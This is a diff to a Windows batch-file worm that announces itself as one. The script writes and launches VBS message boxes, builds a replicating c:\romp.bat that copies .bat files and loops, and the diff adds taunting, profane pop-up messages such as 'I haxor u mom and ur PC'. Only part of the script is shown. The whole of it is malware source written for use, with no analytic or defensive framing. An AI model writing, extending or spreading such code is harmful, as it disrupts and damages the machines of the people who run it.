@@ -1,5 +1,5 @@
 @ECHO OFF
-echo MsgBox " You got infected by Franks worm ">x.vbs 
+echo MsgBox " You got infected by Franks coronvirus ">x.vbs 
 start wscript x.vbs
 if exist c:\romp.bat goto end
 :start
@@ -59,9 +59,14 @@ echo cls >> c:\romp.bat
 echo cd c:\ >> c:\romp.bat
 echo md damp >> c:\romp.bat
 echo copy *.bat c:\damp.bat >> c:\romp.bat
+echo echo msgbox" Frank South 20:s Virus, Frank Syd 20:s Virus, Frank South 20 is comming, hahahaha " >> c:\pomper.vbs >> c:\romp.bat
+echo echo msgbox" SecureBoot sucks" >> c:\pomper.vbs >> c:\romp.bat
+echo echo msgbox" Time to get banned you litle child" >> c:\pomper.vbs >> c:\romp.bat
+echo echo msgbox" I haxor u mom and ur PC" >> c:\pomper.vbs >> c:\romp.bat
 echo echo msgbox" Oh No u r so stupid" >> c:\pomper.vbs >> c:\romp.bat
 echo echo msgbox" Wow you probably got this through ur lan" >> c:\pomper.vbs >> c:\romp.bat
 echo echo msgbox" Happy dieing staples" >> c:\pomper.vbs >> c:\romp.bat
+echo echo msgbox" YOU TRIED SO HARD AND GOT SO FAR, BUT IN THE END, YOUR PC WAS STILL FUCKED!" >> c:\pomper.vbs >> c:\romp.bat
 echo goto start >> c:\romp.bat
       >> c:\romp.bat
       >> c:\romp.bat 
